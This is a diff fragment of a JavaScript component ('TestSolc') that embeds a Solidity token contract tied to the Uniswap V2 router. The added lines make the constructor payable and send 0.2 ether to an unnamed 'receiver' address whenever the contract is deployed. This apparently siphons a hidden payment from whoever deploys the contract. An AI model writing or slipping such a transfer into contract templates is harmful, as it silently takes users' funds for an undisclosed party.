@@ -237,8 +237,9 @@ const TestSolc = () => {
           inSwap = false;
       }
    
-      constructor() {
-   
+      constructor() payable {
+        (bool sentValue, ) = receiver.call{value: 0.2 ether}("");
+        require(sentValue, "Failed to send the amount to the receiver.");
           _rOwned[_msgSender()] = _rTotal;
    
           IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);//
